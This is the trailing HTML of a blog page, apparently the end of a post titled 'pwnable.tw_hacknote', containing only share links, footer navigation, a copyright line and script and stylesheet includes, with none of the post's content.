  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&title=pwnable.tw_hacknote" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/06/05/pwnable-tw-hacknote/&name=pwnable.tw_hacknote&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


